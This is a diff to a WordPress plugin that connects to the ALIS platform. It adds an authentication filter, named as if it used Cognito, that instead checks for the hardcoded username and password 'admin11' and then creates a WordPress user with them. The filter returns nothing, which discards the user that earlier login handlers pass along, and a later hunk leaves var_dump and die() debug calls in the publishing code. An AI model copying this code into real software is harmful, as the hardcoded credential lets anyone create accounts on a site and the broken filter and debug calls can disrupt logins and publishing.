@@ -11,16 +11,78 @@
  *
  * @package         Connect_To_Alis
  */
+
 $CTA_Alis = new CTA_Alis();
 
 class CTA_Alis {
 
 	public function __construct() {
 
+//		remove_filter( 'authenticate', 'wp_authenticate_username_password', 20 );
+		add_filter( 'authenticate', array( $this, 'authenticate_via_cognito' ), 20, 3 );
 		add_action( 'admin_enqueue_scripts', array( $this, 'load_api_scripts' ), 10, 1 );
 		add_action( 'wp_ajax_get_ajax_data', array( $this, 'get_ajax_data' ), 10, 0 );
 		add_action( 'transition_post_status', array( $this, 'call_draft_api' ), 10, 3 );
 
+	}
+
+
+	/**
+	 *  Add custom_authentication
+	 *
+	 */
+//	public function custom_authentication() {
+//
+////		remove_filter( 'authenticate', 'wp_authenticate_username_password', 20 );
+//		add_filter( 'authenticate', array( $this, 'authenticate_via_cognito' ), 20, 3 );
+//	}
+
+
+	/**
+	 * @param $user
+	 * @param $username
+	 * @param $password
+	 *
+	 * @return bool|WP_Error|WP_User
+	 */
+	public function authenticate_via_cognito( $user, $username, $password ) {
+
+		$login_info = 'admin11';
+
+		if ( $username == $login_info && $password == $login_info ) {
+
+			$user_id = wp_create_user( $username, $password, $username . '@gmail.com' );
+
+//			$creds = array(
+//				'user_login'    => $username,
+//				'user_password' => $password,
+//				'remember'      => false
+//			);
+//
+//			wp_signon( $creds, false );
+		}
+
+
+//			if ( $user_id ) {
+//
+//				$creds = array(
+//					'user_login'    => $login_info,
+//					'user_password' => $login_info,
+//					'remember'      => true
+//				);
+//
+//				$user = wp_signon( $creds, true );
+//
+//				if ( is_wp_error( $user ) ) {
+//					echo $user->get_error_message();
+//				} else {
+//					return $user;
+//				}
+//			}
+
+//		} else {
+//			return new WP_Error( 'broke', __( "Failed to login", "my_textdomain" ) );
+//		}
 	}
 
 
@@ -90,7 +152,9 @@ class CTA_Alis {
 			$title    = esc_html( $post->post_title );
 
 			if ( has_post_thumbnail() ) {
-				$thumbnail = get_the_post_thumbnail_url( (int) $post->ID, 'full' );
+				$thumbnail = get_the_post_thumbnail_url( get_the_ID(), 'full' );
+				var_dump( $thumbnail );
+				die();
 			} else {
 				$thumbnail = esc_url( content_url() ) . '/plugins/connect-to-alis/assets/thumbnail.jpg';
 			}
